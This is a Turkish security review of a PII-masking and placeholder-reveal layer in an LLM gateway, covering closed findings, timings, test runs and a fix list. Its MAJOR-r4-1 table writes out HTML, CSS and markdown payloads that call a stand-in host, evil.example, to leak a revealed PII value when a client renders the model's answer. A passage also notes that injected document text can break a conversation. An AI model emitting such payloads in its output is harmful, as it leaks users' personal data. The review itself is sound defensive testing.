# 08-tam-1a r4 inceleme (delta, r3 DEGISIKLIK kapanışı)

- **SHA:** 4aecdbc327a3a85e328045bf103b3d186c66ace9 (feat/08-tam-1-ner; 370912d üstüne 9 commit, 19 dosya +801/-98, `state/` 0)
- **İstek:** K-08T1-0022 · Cevap: R-08T1-0007 (r3), K-08T1-0018 (DUZELT), K-08T1-0020/0021 (ek (e)/(d) düzeltmeleri)
- **İnceleyici worktree:** `.worktrees/review-08t1a-r4` (temiz; probe'lar tek dosya mount ile koşuldu, mount noktaları silindi)
- **Yığın:** review08t1a, 18290/13290, `--profile test --profile qdrant`, `--pull never`, hepsi healthy
- **Karar: DEGISIKLIK** — BLOCKER 0, MAJOR 1, MINOR 6, NOTE 7

r3'ün iki MAJOR'ı istenen kapsamda kapandı:
- **MAJOR-r3-1:** r3 tablosundaki bütün HTML yazımları ve K-08T1-0022'nin istediği yeni yazımlar dört okuma biçiminde tutuluyor.
- **MAJOR-r3-2:** 100 bin karakter, 1 karakterlik parçalarla 0,4-0,6 s (r3'te 23-28 s).

Kalan MAJOR şu: satır temelli sınıf kuralı, bu turda yeniden yazılan HTML/CSS yazımlarıyla yine atlatılıyor. Yedi yazım doğrulandı ve en az ikisi bu delta'nın gerilemesi. Dört turdur aynı sınıf yeni bir yazımla açılıyor, bu yüzden aşağıda bir yapı kararı öneriyorum (A/B).

## r3 bulgularının kapanışı

| r3 | Durum | Kanıt |
|---|---|---|
| MAJOR-r3-1 HTML yeniden yazımları | **KISMİ** (istenen yazımlar kapandı, yeni yazımlar açık: MAJOR-r4-1) | Mağaza düzeyi (`08t1a-r4-probe.log`): r3'ün 4 yazımı ve yeni yazımlar tek parça + akış 1/7/50 + canlı biçimde tutuldu. Yeni yazımlar: `<a\nhref`, `<svg><image href`, `url( 'http:' )`, `<IMG SRC`, `&#x3a;` (öznitelik ve markdown), 3 satıra yayılan etiket, boş satırdan sonra etiket değeri, `srcdoc`, CSS bloğu, `<http:…>` otomatik bağlantı, `]: <…>`. Facade düz yol, uçtan uca: `src NL =`, `object data`, `a NL href`, `IMG SRC`, kısa md görseli → sağlayıcı değeri görmedi, cevapta yer tutucu, değer dönmedi (`08t1a-r4-int-probe-llmaas.log`). r3 probe'u bu SHA'da: saldırı yazımlarının hepsi tutuldu (`08t1a-r4-r3probe.log`). |
| MAJOR-r3-2 her parçada yeniden tarama | **KAPANDI** | `StreamDetokenizer` / `ContextReveal`: 100 bin tek satır, 1 karakterlik parça 0,60 / 0,43 s; 64 bin, 4 karakterlik parça 0,08 / 0,08 s; işaret baştaysa 0,27 / 0,20 s; her satırda etiket olan 362 bin karakter 0,30 s; her parçası öznitelik adıyla biten 162 bin karakter 0,33 s; düz metin 122 bin 0,23 s. |
| MINOR-r3-1 yeniden bağlanma | **KAPANDI** (ek (d) düzeltilmiş hâli) | Gerçek Redis akışı + `api.runs.detokenizer(after=…)`: r3 senaryosu (e1 `](https://…?q=` + yeniden bağlanma + e2) tutuldu; onay sonrası yeni satırda ve aynı düz satırda sahip değeri görüyor; iki satır önce açılmış HTML değeri tutuldu; akışta olmayan `after` fail-closed. Kalan durum: NOTE-r4-3. |
| MINOR-r3-2 9 hane | **KAPANDI** (sınır) | `reserve 99999997 → 99999998 → 99999999 → PlaceholderOutOfRange`; `reserve_carried <<PII_99999998>>` geçiyor, `<<PII_99999999>>` reddediliyor, `<<PII_100000000>>` yok sayılıyor; 9 haneli yer tutucu hiçbir kapsamda açılmıyor. Hata yüzeyi: MINOR-r4-1. |
| MINOR-r3-3 komşu facade yolları | **KAPANDI** | `token_store_errors` `FacadeGuard.reveal` içinde (`facade_guard.py:161-164`). Tek parça `_answer`, `_checked_calls`, tamponlu akış ve dış agent bunun üstünden geçiyor. Testler `test_08t_r3_minors.py:38,58`. |
| MINOR-r3-4 boş satır | **KAPANDI** (ek (e) düzeltilmiş hâli) | `_closes_on_blank` yalnız markdown hedefini kapatıyor (`masking.py:427-428`). Probe: `<img src="…?q=` + boş satır + `<<PII_1>>">` tutuldu; markdown hedefi boş satırla kapanıyor. Atlatma: MAJOR-r4-1 (b). |
| MINOR-r3-5 docs | **KISMİ** | agentlar.md URL kuralı ve facade agent yeniden bağlanma ifadesi düzeldi. Yer tutucu aralık hatasının metni yanlış: MINOR-r4-1. |
| MINOR-r3-6 canlı yeniden bağlanma testi | **KAPANDI** | `test_08t_r3_minors.py:98-117` (birim sahte akış; gerçek Redis yolu bu turun probe'unda). |
| MINOR-r3-7, NOTE-3/5 | FOLLOWUP-162 | PR:212 |
| MINOR-r3-8 PR r1 satırı | **KAPANDI** (artık var) | PR:156 hâlâ artık olmayan `test_08t_m2_client_history_stored_before_egress` testini anıyor (NOTE-r4-6). |
| NOTE-1 zaman testi | **KAPANDI** | Alt süreç yalnız `find_secrets` süresini ölçüyor, bütçe 2 s. Airgap `make test` bu turda 1382/1382 (yükte). |

## Koordinatör maddeleri (K-08T1-0022)

1. **MAJOR-r3-1 tabloları ve yeni yazımlar:** yukarıda; istenenlerin hepsi tutuldu. Yeni atlatmalar MAJOR-r4-1'de.
2. **Performans ve varsayım 12:** yukarıdaki ölçümler. Hazırlık (prime) 2.000 girdi 0,023 s, 20.000 girdi 0,355 s.
   - **Varsayım 12 KABUL.** Bütün girdileri taramak, kararın "yalnız son satırın kuyruğu" ifadesinden daha doğru: önceki satırda açılmış bir HTML tırnağı (ek (e) gereği cevap sonuna kadar süren durum) ancak böyle kurulabiliyor. Probe'da "iki satır önce açılmış HTML değeri" bu sayede tutuldu.
   - Bedel koşu uzunluğuyla doğrusal ve yeniden bağlanma başına bir kez. Akışta MAXLEN yok, kırpılma yok.
   - Öneri: XRANGE `COUNT` ile sayfalansın (NOTE-r4-4).
3. **MINOR-r3-1:** kapandı (yukarıda).
4. **99.999.998 sınırı:** kapandı. Hata yüzeyi MINOR-r4-1, kalıcı konuşma bozulması MINOR-r4-2.
5. **MINOR-r3-3/6:** kapandı.
6. **Varsayım 13 (`src=<x` açılı hedef değil): KABUL.** Pratikte `<x` etiket açıcısına düşüyor ve `tag` kipine giriyor, yani yine fail-closed.
7. **4aecdbc test düzeltmesi: KISMEN DOĞRU.** Fake sağlayıcı `"hello " + tool_content[:50]` döndürüyor (`tests/fakes/fake_openai.py:67`). On yazımdan yalnız `style … url(http:…)` 50 karakteri aşıyor; o yazımda ne yer tutucu ne değer cevaba ulaşıyor ve test boşuna geçiyor (probe'da da görüldü). Diğer dokuz yazımda yer tutucu cevaba ulaşıyor, ama 4aecdbc `"<<PII_" in content` iddiasını hepsinden kaldırdı. Test artık "yer tutucu cevaba geldi ve tutuldu"yu kanıtlamıyor (MINOR-r4-4).
8. **docs/PR notu:** büyük ölçüde birebir; sapmalar MINOR-r4-1 ve NOTE-r4-6.
9. **Tam yığın test-int ve 06b-2:** Koşular tablosunda.

## Yeni bulgular

### MAJOR-r4-1 · Satır/taşıma modeli HTML-CSS yazımlarıyla yine atlatılıyor (yapı kararı gerekir) — CONFIRMED (mağaza düzeyi, backend konteyneri)

`08t1a-r4-adv-probe.log`; her satır tek parça + akış 1/7/50:

| Yazım | Sonuç | Neden | Durum |
|---|---|---|---|
| (a) `<img alt=a"b src="https://evil.example/?x=>` + satır sonu + `<<PII_1>>">` | **AÇILDI** (4 biçim) | `tag` kipi her `"`'ı öznitelik tırnağı sayıyor (`masking.py:403-408`). Tarayıcı tırnağı yalnız `=`'den hemen sonra açar: `alt=a"b` tırnaksız değer, `src` tırnaklı ve satır sonunu geçiyor; değer `>`'den sonra satır sonuna gidiyor. | **gerileme** (370912d'de `src=` → expect → dq açık kalıyordu) |
| (a') `<img "a src="https://…?x=>` + satır sonu + `<<PII_1>>">` | **AÇILDI** | aynı | gerileme |
| (b) `[a]( <img src="https://…?q=)` + satır sonu + `<<PII_1>>">` | **AÇILDI** | En soldaki açıcı `](` kazanıyor, `)` ile kapanıyor, `tag` kipine hiç girilmiyor. CommonMark'ta bağlantı değil, ama satır içi ham HTML geçerli. | 370912d'de de vardı |
| (b') `<pre>[a]( <img src="https://…?q=` + boş satır + `<<PII_1>>">` | **AÇILDI** | `<pre>` kapandıktan sonra `](` derinlik 1; boş satır bunu kapatıyor (ek (e)). `<pre>` HTML bloğu boş satırla bitmez. | **gerileme** (ek (e)) |
| (c) `<PII_1 style` + satır sonu + `="…background-image:&#117;rl(https&#58;&#47;&#47;evil.example/?q=<<PII_2>>)">` | **AÇILDI** (tek parça, akış 7/50) | `_HTML_TAG` istisnası `<(?!PII_\d)` `<PII_1`'i etiket saymıyor; tarayıcı bunu `pii_1` öğesi olarak ayrıştırıyor. Satır sonundaki öznitelik adı taşıması yalnız işaretli satırlarda çalışıyor. İkinci satırda varlık kodlu `url(`/şema var, literal işaret yok. | yeni |
| (d) `<style>` + satır sonu + `body{background-image:\75 rl("\68ttps\3a\2f\2f evil.example/?q=<<PII_1>>")}` + satır sonu + `</style>`; aynısı `@import` ile | **AÇILDI** | `<style>` satırı `>` ile kapanıyor; CSS kaçışları yalnız tarayıcıda çözülüyor, ikinci satırda literal işaret yok. | 370912d'de de vardı |
| (e) akışta `![x](\r` \| `\n&#47;&#47;evil.example/?q=<<PII_1>>)` | **AÇILDI** (akış 1, canlı parçalar) | İki parçaya bölünen CRLF boş satır sayılıyor ve markdown hedefini kapatıyor. | `\r` bölünmesi eskiden de vardı; boş satırla kapanma yeni |

Etki koşulu, MAJOR-r3-1 ile aynı: istemci ham HTML'i (ve (e) için markdown'u) işliyor. Karar A HTML'i tehdit modeline aldığı için aynı önem.

**Gözlem:** r1'den bu yana her tur bir yazım listesini kapattı, sonraki tur yenisini buldu. Satır ve taşıma durum makinesi bir HTML/CSS/markdown ayrıştırıcısını yeniden üretmeye çalışıyor; her ayrım (tırnak kuralı, açıcı önceliği, blok türü, kaçışlar) yeni bir yazım açıyor. FELSEFE açısından: fail-closed bir kural kendi ayrımlarına güvenmemeli.

**Koordinatör kararı (A önerilen):**

- **A (önerilen) — cevap düzeyinde HTML fail-closed.** Bir cevapta (tek parça metin ya da akış) ilk HTML işaretinden sonra o cevabın geri kalanındaki hiçbir yer tutucu açılmaz.
  - HTML işareti: `<harf`; istisna yalnız tam bir yer tutucu `<<PII_\d{1,8}>>` için.
  - Markdown için satır kuralı ve boş satırla kapanma aynen kalır.
  - CRLF parça sınırında bekletilir (`\r` ile biten parça satırı bitirmez).
  - Etki: (a)-(d) yapıdan bağımsız kapanır. Kod küçülür: `tag`/`tag_dq`/`tag_sq`/`expect` kipleri gereksizleşir. HTML içeren cevaplarda ilk etiketten sonraki değerler yer tutucu kalır (`a<b` gibi matematik düzyazı da dahil). Kullanılabilirlik kaybı yalnız HTML yazan cevaplarda.
- **B — satır modelini yine yamala.**
  - tırnak yalnız `=`'den sonra açılır;
  - `tag` kipi `](`'dan önceliklidir;
  - `<pre>/<style>/<script>/<textarea>` blok içeriği kapanış etiketine kadar işaretlidir;
  - istisna yalnız tam yer tutucu;
  - CRLF bekletilir.

  Etki: bu yedi yazım kapanır ama sınıf açık kalır; bir sonraki tur yeni bir yazım bulma olasılığı yüksek.
- **C — HTML'i tehdit modelinden çıkar ve docs'a "ham HTML işleyen istemci desteklenmez" yaz.** Etki: en az kod; karar A'nın kapsamını daraltır. Ham HTML işleyen üçüncü taraf istemcilerde risk kullanıcıya geçer.

### MINOR-r4-1 · Yer tutucu aralık hatasının yüzeyi docs ile uyuşmuyor; egress'te `on_error` yolundan geçiyor — CONFIRMED (kod)

- **Egress'te `token_for` taşması:** `apply_findings` içinde yükselen `PlaceholderOutOfRange`'ı motor `rule_error` olarak yakalıyor (`engine.py:330-338`).
  - Varsayılan `block`: koşu `guardrail_block`, facade 400 `guardrail_blocked` dönüyor. Docs'un dediği `placeholder_out_of_range` değil.
  - `on_error=log`: metin tokenize edilmeden devam ediyor ve ham değer sağlayıcıya gidiyor. Çağıran bunu kasıtlı tetikleyebilir: `<<PII_99999998>>` + iki PII değeri. Bu, Redis kesintisindeki `on_error` davranışıyla aynı, ama artık çağıranın elinde bir tetikleyici var.
- **`api.md:537-538` iki yerde yanlış:**
  - 9 haneli numara reddedilmiyor, yok sayılıyor; tetikleyici 8 haneli 99.999.999.
  - İstemci geçmişi olmayan facade agent isteği `_history`'de düşüyor ve 502 `api_error` dönüyor, 400 değil.
- **Düzeltme:** `PlaceholderOutOfRange` motor içinde `rule_error`'a çevrilmeden yeniden yükseltilsin (fail-loud, `on_error`'dan bağımsız); docs durum ve kodu yola göre doğru yazsın.

### MINOR-r4-2 · Konuşmadaki `<<PII_99999999>>` o konuşmanın sonraki her koşusunu kalıcı düşürüyor (karar (f)'nin lafzı; amacı başka yolla karşılanabilir) — kod okuması

Soru ve cevaplar `messages`'a yazılıyor; `_history` her koşuda hepsini ayırıyor (`adapters.py:595-598`). Kullanıcı yazarsa ya da bir belgeden enjekte edilip cevaba yankılanırsa konuşma kullanılamaz hâle geliyor. `<<PII_99999998>>` ise sonraki her koşuyu tek PII değeriyle sınırlıyor. Docs ve PR bunu yazmıyor.

Öneri (koordinatör): 99.999.999 hiçbir kapsamda verilmesin, ayrılmasın, açılmasın (verme üst sınırı 99.999.998); taşınan 99.999.999 yok sayılsın. Çakışma önleme amacı korunur, kalıcı bozulma olmaz. Ya da mevcut davranış kalsın ve docs'a yazılsın.

### MINOR-r4-3 · Hazırlık başarısız olduğunda yalnız ilk satır tutuluyor — CONFIRMED (mağaza düzeyi)

`fail_closed()` yalnız `_marked`'ı set ediyor. `after`'dan önce açılmış bir HTML değeri ikinci satırda açılıyor (`ADV fail_closed, second line … REVEALED`). Tetikleyici yalnız hazırlık hatası: akışta olmayan `after` ya da XRANGE'te Redis hatası; akış yukarısı tetikleyemez. Ek (e)'nin mantığıyla uyumlu düzeltme: hazırlık başarısızsa `_lost=True`, yani cevap sonuna kadar tutulur. Koordinatör kararı (ek (d) "ilk satır" diyor).

### MINOR-r4-4 · 4aecdbc testi zayıfladı

`test_08t_r2_paths.py:53-61`: `style` yazımı fake'in 50 karakterlik kesiminde kayboluyor ve test boşuna geçiyor. Diğer dokuz yazımda `"<<PII_" in content` iddiası gereksiz yere kaldırılmış. Düzeltme: kesime sığan yazımlarda güçlü iddia kalsın, `style` yazımı kısaltılsın (`background:` yerine `x`).

### MINOR-r4-5 · Kullanılabilirlik: kapanmayan durumlar

- Düzyazıda `Personal data: <<PII_1>>` ya da `Attached file: …` şema işaretine (`data:`, `file:`) takılıyor.
- `if x<y then …` `tag` kipine girip `>` gelene kadar sonraki satırları tutuyor; boş satır bunu kapatmıyor.
- Kapanmayan düzyazı `url(` cevap sonuna kadar sürüyor.

Fail-closed, sızıntı yok. A seçeneği seçilirse ilk ikisi bilinçli takas olarak docs'a yazılmalı.

### MINOR-r4-6 · Hazırlıkta beklenmeyen hata akışı olaysız kesiyor — kod okuması

`prime()` içinde Redis dışı bir hata (bozuk `text`, KeyError) `transform`'dan kaçıyor; `follow` yalnız `RevealUnavailable` yakalıyor (`events.py:248-252`). Akış hata olayı olmadan bitiyor. Olasılık düşük. Düzeltme: `prime` hatası `fail_closed`'a düşsün.

## NOTE

1. `facade_proxy.py:492-499` `finally` içindeki `gate.commit` (kota, Redis) başlıklar gittikten sonra `RedisError` verirse akış olaysız biter (önceden var).
2. `facade_proxy.py:530-531`: `detokenize_unavailable` dışı bir `ApiError` dalında `_rest_chunk` → `revealer.rest()` 502 yükseltebilir ve akış olaysız biter. İkinci bir hata gerekiyor (doğrulanmadı).
3. Akış süresi dolmuşsa (replay) `fail_closed` saklanan cevabın ilk satırını gereksiz tutuyor; replay satırları `detokenize_json` ile tek başına işlendiği için pratikte etkisiz.
4. Hazırlık tek XRANGE ile bütün akışı okuyor (`COUNT` yok). 20 bin girdi 0,36 s; sayfalama önerilir.
5. `reveal_text` büyük tek parça cevapta span × yer tutucu karşılaştırması yapıyor (önceden var).
6. PR notu:
   - satır 156 artık olmayan bir test adını anıyor;
   - "Bilinen sınırlar (r2 sonrası)" (171) hâlâ "bağlantı içeren satır" diyor;
   - r3 NOTE-4 (probe yapaylığı) PR'da ya da FOLLOWUP'ta yok;
   - r4 kapı tablosunda yalnız `test_08t_r2_paths.py` HEAD'de yeniden koşulmuş (test değişikliği olduğu için kabul edilebilir).
7. FFCore konsolu cevabı düz metin gösteriyor; MAJOR-r4-1'in etkisi ham HTML/markdown işleyen istemcilerde.

## Güvenlik turu

- **Sağlayıcıya ham değer:** gitmiyor. r3 uçtan uca probe'u bu SHA'da yeşil (`min_confidence` 0,8, `<<PII_10>>`, saklanan görünümler temiz). İstisna: `on_error=log` + kasıtlı aralık taşması (MINOR-r4-1).
- **İstemci tarafı sıfır tık:** markdown ve listelenen HTML yazımları kapalı. Yeni HTML/CSS yazımları ve parçalı CRLF açık (MAJOR-r4-1). Yeniden bağlanma kapalı, hazırlık hatasında ikinci satır açık (MINOR-r4-3).
- **Kişi verisinin karışması:** 9 haneli çakışma kapandı.
- **Erişilebilirlik:**
  - olay döngüsü blokajı kapandı;
  - kalıcı konuşma düşmesi var (MINOR-r4-2);
  - hazırlık bedeli doğrusal.
- **S8:** değişmedi.
- **06b-2 SSRF ve 147:** bu SHA'da iki profilde 138/138; gerileme yok.

## Koşular

| Koşu | Sonuç | Kanıt |
|---|---|---|
| `make test` llmaas | 1382 passed (3:00) | `state/evidence/08t1a-r4-unit-llmaas.log` |
| `make test` airgap | 1382 passed (3:00) | `08t1a-r4-unit-airgap.log` |
| `make test-int` llmaas (tam yığın) | 848 passed, 5 skipped (11:35), kırmızı yok | `08t1a-r4-int-llmaas.log` |
| `make test-int` airgap (tam yığın) | 846 passed, 7 skipped (10:38), kırmızı yok | `08t1a-r4-int-airgap.log` |
| r2 + r3 + r4 entegrasyon probe'ları llmaas (facade geçmiş, 4 md yazımı, `min_confidence` 0,8 uçtan uca, 7 HTML yazımı) | 13/13 yeşil | `08t1a-r4-int-probe-llmaas.log`, `state/reviews/08-tam-1a-r4-int-probe.py` |
| r3 mağaza düzeyi probe'u bu SHA'da | saldırı yazımlarının hepsi tutuldu | `08t1a-r4-r3probe.log` |
| r4 mağaza düzeyi probe (yazımlar, boş satır, gerçek Redis'le yeniden bağlanma, hazırlık bedeli, performans, sınır) | yukarıda | `08t1a-r4-probe.log`, `state/reviews/08-tam-1a-r4-probe.py` |
| r4 adversarial adaylar | 7 yazım + fail_closed ikinci satır AÇILDI | `08t1a-r4-adv-probe.log`, `state/reviews/08-tam-1a-r4-adv-probe.py` |
| 06b-2 SSRF probe + 06b-2/147 | 138/138 llmaas, 138/138 airgap | `08t1a-r4-06b2-probe-{llmaas,airgap}.log` |
| lint | NOT_RUN: işçi kanıtı "lint 0" | — |

## İşçiye kısa liste (DUZELT önerisi; MAJOR-r4-1 koordinatör kararına bağlı)

1. MAJOR-r4-1: A, B ya da C kararına göre; testler bu raporun yedi yazımı, dört okuma biçiminde.
2. MINOR-r4-1: `PlaceholderOutOfRange` motorda `on_error`'dan bağımsız fail-loud; docs durum ve kodu.
3. MINOR-r4-2 (karar): 99.999.999 verilmesin/ayrılmasın ya da docs.
4. MINOR-r4-3 (karar): hazırlık hatasında `_lost`.
5. MINOR-r4-4, -6 ve NOTE-6: test, `prime` hata yolu, PR notu.
